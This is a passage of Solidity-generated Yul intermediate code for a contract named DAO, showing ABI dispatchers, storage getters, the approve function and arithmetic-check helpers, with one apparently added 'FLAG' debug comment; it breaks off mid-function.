                        /// @src 0:15793:15843  "mapping (address => bool) public allowedRecipients"
                        function getter_fun_allowedRecipients_732(key_0) -> ret {

                            let slot := 12
                            let offset := 0

                            slot := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(slot, key_0)

                            ret := read_from_storage_split_dynamic_t_bool(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_allowedRecipients_732() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  getter_fun_allowedRecipients_732(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_transferWithoutReward_2599() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transferWithoutReward_2599(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_encode_tuple__to__fromStack(headStart ) -> tail {
                            tail := add(headStart, 0)

                        }

                        function external_fun_refund_651() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            fun_refund_651()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                            return(memPos, sub(memEnd, memPos))

                        }

                        function array_allocation_size_t_string_memory_ptr(length) -> size {
                            // Make sure we can allocate memory without overflow
                            if gt(length, 0xffffffffffffffff) { panic_error_0x41() }

                            size := round_up_to_mul_of_32(length)

                            // add length slot
                            size := add(size, 0x20)

                        }

                        function abi_decode_available_length_t_string_memory_ptr(src, length, end) -> array {
                            array := allocate_memory(array_allocation_size_t_string_memory_ptr(length))
                            mstore(array, length)
                            let dst := add(array, 0x20)
                            if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }
                            copy_calldata_to_memory_with_cleanup(src, dst, length)
                        }

                        // string
                        function abi_decode_t_string_memory_ptr(offset, end) -> array {
                            if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }
                            let length := calldataload(offset)
                            array := abi_decode_available_length_t_string_memory_ptr(add(offset, 0x20), length, end)
                        }

                        function validator_revert_t_bool(value) {
                            if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_bool(offset, end) -> value {
                            value := calldataload(offset)
                            validator_revert_t_bool(value)
                        }

                        function abi_decode_tuple_t_addresst_uint256t_string_memory_ptrt_bytes_memory_ptrt_uint256t_bool(headStart, dataEnd) -> value0, value1, value2, value3, value4, value5 {
                            if slt(sub(dataEnd, headStart), 192) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32
                                value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := calldataload(add(headStart, 64))
                                if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }

                                value2 := abi_decode_t_string_memory_ptr(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := calldataload(add(headStart, 96))
                                if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }

                                value3 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 128

                                value4 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 160

                                value5 := abi_decode_t_bool(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_newProposal_1450() {
                            let param_0, param_1, param_2, param_3, param_4, param_5 :=  abi_decode_tuple_t_addresst_uint256t_string_memory_ptrt_bytes_memory_ptrt_uint256t_bool(4, calldatasize())
                            let ret_0 :=  fun_newProposal_1450(param_0, param_1, param_2, param_3, param_4, param_5)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot , key) -> dataSlot {
                            mstore(0, convert_t_address_to_t_address(key))
                            mstore(0x20, slot)
                            dataSlot := keccak256(0, 0x40)
                        }

                        /// @ast-id 748
                        /// @src 0:16673:16716  "mapping (address => uint) public DAOpaidOut"
                        function getter_fun_DAOpaidOut_748(key_0) -> ret {

                            let slot := 17
                            let offset := 0

                            slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_DAOpaidOut_748() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  getter_fun_DAOpaidOut_748(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 724
                        /// @src 0:15515:15543  "uint public minQuorumDivisor"
                        function getter_fun_minQuorumDivisor_724() -> ret {

                            let slot := 9
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_minQuorumDivisor_724() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_minQuorumDivisor_724()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_newContract_2367() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            fun_newContract_2367(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_balanceOf_109() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  fun_balanceOf_109(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_addresst_bool(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_bool(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_changeAllowedRecipients_2789() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_bool(4, calldatasize())
                            let ret_0 :=  fun_changeAllowedRecipients_2789(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_transfer_2_2578() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transfer_2_2578(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_halveMinQuorum_2908() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_halveMinQuorum_2908()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 752
                        /// @src 0:16795:16835  "mapping (address => uint) public paidOut"
                        function getter_fun_paidOut_752(key_0) -> ret {

                            let slot := 18
                            let offset := 0

                            slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_paidOut_752() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  getter_fun_paidOut_752(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_uint256t_address(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_splitDAO_2289() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_uint256t_address(4, calldatasize())
                            let ret_0 :=  fun_splitDAO_2289(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 744
                        /// @src 0:16560:16598  "ManagedAccount public DAOrewardAccount"
                        function getter_fun_DAOrewardAccount_744() -> ret_address {

                            let slot := 16
                            let offset := 0

                            ret_address := read_from_storage_split_dynamic_t_contract$_ManagedAccount_$375(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_DAOrewardAccount_744() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_DAOrewardAccount_744()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_contract$_ManagedAccount_$375__to_t_address_payable__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 758
                        /// @src 0:17166:17193  "uint public proposalDeposit"
                        function getter_fun_proposalDeposit_758() -> ret {

                            let slot := 20
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_proposalDeposit_758() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_proposalDeposit_758()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_numberOfProposals_2944() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_numberOfProposals_2944()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 726
                        /// @src 0:15620:15652  "uint public lastTimeMinQuorumMet"
                        function getter_fun_lastTimeMinQuorumMet_726() -> ret {

                            let slot := 10
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_lastTimeMinQuorumMet_726() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_lastTimeMinQuorumMet_726()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_retrieveDAOReward_2461() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_bool(4, calldatasize())
                            let ret_0 :=  fun_retrieveDAOReward_2461(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_receiveEther_1219() {

                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_receiveEther_1219()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_transfer_157() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transfer_157(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 381
                        /// @src 0:8840:8860  "bool public isFueled"
                        function getter_fun_isFueled_381() -> ret {

                            let slot := 2
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_bool(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_isFueled_381() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_isFueled_381()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_createTokenProxy_569() {

                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  fun_createTokenProxy_569(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_encode_tuple_t_address__to_t_address__fromStack(headStart , value0) -> tail {
                            tail := add(headStart, 32)

                            abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                        }

                        function external_fun_getNewDAOAddress_2964() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_uint256(4, calldatasize())
                            let ret_0 :=  fun_getNewDAOAddress_2964(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_uint256t_bool(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_bool(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_vote_1605() {
                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_uint256t_bool(4, calldatasize())
                            fun_vote_1605(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_getMyReward_2473() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_getMyReward_2473()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 736
                        /// @src 0:16163:16207  "mapping (address => uint) public rewardToken"
                        function getter_fun_rewardToken_736(key_0) -> ret {

                            let slot := 13
                            let offset := 0

                            slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_rewardToken_736() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  getter_fun_rewardToken_736(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_transferFromWithoutReward_2672() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1, param_2 :=  abi_decode_tuple_t_addresst_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transferFromWithoutReward_2672(param_0, param_1, param_2)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_allowance_268() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_address(4, calldatasize())
                            let ret_0 :=  fun_allowance_268(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_changeProposalDeposit_2758() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_uint256(4, calldatasize())
                            fun_changeProposalDeposit_2758(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 756
                        /// @src 0:16971:17011  "mapping (address => uint) public blocked"
                        function getter_fun_blocked_756(key_0) -> ret {

                            let slot := 19
                            let offset := 0

                            slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_blocked_756() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                            let ret_0 :=  getter_fun_blocked_756(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function extract_from_storage_value_dynamict_address(slot_value, offset) -> value {
                            value := cleanup_from_storage_t_address(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                        }

                        function read_from_storage_split_dynamic_t_address(slot, offset) -> value {
                            value := extract_from_storage_value_dynamict_address(sload(slot), offset)

                        }

                        /// @ast-id 728
                        /// @src 0:15689:15711  "address public curator"
                        function getter_fun_curator_728() -> ret {

                            let slot := 11
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_address(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_curator_728() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_curator_728()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_transferFrom_2_2644() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1, param_2 :=  abi_decode_tuple_t_addresst_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transferFrom_2_2644(param_0, param_1, param_2)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_uint256t_addresst_uint256t_bytes_memory_ptr(headStart, dataEnd) -> value0, value1, value2, value3 {
                            if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 64

                                value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := calldataload(add(headStart, 96))
                                if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }

                                value3 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_checkProposalCode_1484() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1, param_2, param_3 :=  abi_decode_tuple_t_uint256t_addresst_uint256t_bytes_memory_ptr(4, calldatasize())
                            let ret_0 :=  fun_checkProposalCode_1484(param_0, param_1, param_2, param_3)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 383
                        /// @src 0:9046:9076  "address public privateCreation"
                        function getter_fun_privateCreation_383() -> ret {

                            let slot := 2
                            let offset := 1

                            ret := read_from_storage_split_dynamic_t_address(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_privateCreation_383() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_privateCreation_383()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function zero_value_for_split_t_bool() -> ret {
                            ret := 0
                        }

                        function mapping_index_access_t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$_of_t_address(slot , key) -> dataSlot {
                            mstore(0, convert_t_address_to_t_address(key))
                            mstore(0x20, slot)
                            dataSlot := keccak256(0, 0x40)
                        }

                        function shift_left_0(value) -> newValue {
                            newValue :=

                            shl(0, value)

                        }

                        function update_byte_slice_32_shift_0(value, toInsert) -> result {
                            let mask := 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                            toInsert := shift_left_0(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function convert_t_uint256_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_uint256(value)))
                        }

                        function prepare_store_t_uint256(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_0_t_uint256_to_t_uint256(slot, value_0) {
                            let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)
                            sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_uint256(convertedValue_0)))
                        }

                        /// @ast-id 251
                        /// @src 0:4884:5106  "function approve(address _spender, uint256 _amount) public override returns (bool success) {..."
                        function fun_approve_251(var__spender_224, var__amount_226) -> var_success_230 {
                            /// @src 0:4961:4973  "bool success"
                            let zero_t_bool_1 := zero_value_for_split_t_bool()
                            var_success_230 := zero_t_bool_1

                            /// @src 0:5017:5024  "_amount"
                            let _2 := var__amount_226
                            let expr_238 := _2
                            /// @src 0:4985:4992  "allowed"
                            let _3_slot := 0x06
                            let expr_232_slot := _3_slot
                            /// @src 0:4993:5003  "msg.sender"
                            let expr_234 := caller()
                            /// @src 0:4985:5004  "allowed[msg.sender]"
                            let _4 := mapping_index_access_t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$_of_t_address(expr_232_slot,expr_234)
                            let _5_slot := _4
                            let expr_236_slot := _5_slot
                            /// @src 0:5005:5013  "_spender"
                            let _6 := var__spender_224
                            let expr_235 := _6
                            /// @src 0:4985:5014  "allowed[msg.sender][_spender]"
                            let _7 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_236_slot,expr_235)
                            /// @src 0:4985:5024  "allowed[msg.sender][_spender] = _amount"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_7, expr_238)
                            let expr_239 := expr_238
                            /// @src 0:5048:5058  "msg.sender"
                            let expr_243 := caller()
                            /// @src 0:5060:5068  "_spender"
                            let _8 := var__spender_224
                            let expr_244 := _8
                            /// @src 0:5070:5077  "_amount"
                            let _9 := var__amount_226
                            let expr_245 := _9
                            /// @src 0:5039:5078  "Approval(msg.sender, _spender, _amount)"
                            let _10 := 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
                            let _11 := convert_t_address_to_t_address(expr_243)
                            let _12 := convert_t_address_to_t_address(expr_244)
                            {
                                let _13 := allocate_unbounded()
                                let _14 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_13 , expr_245)
                                log3(_13, sub(_14, _13) , _10, _11, _12)
                            }/// @src 0:5095:5099  "true"
                            let expr_248 := 0x01
                            /// @src 0:5088:5099  "return true"
                            var_success_230 := expr_248
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function zero_value_for_split_t_uint256() -> ret {
                            ret := 0
                        }

                        function cleanup_t_rational_1209600_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_1209600_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_1209600_by_1(value)))
                        }

                        function panic_error_0x11() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x11)
                            // FLAG: THIS REVERT IS CALLED
                            revert(0, 0x24)
                        }

                        function checked_sub_t_uint256(x, y) -> diff {
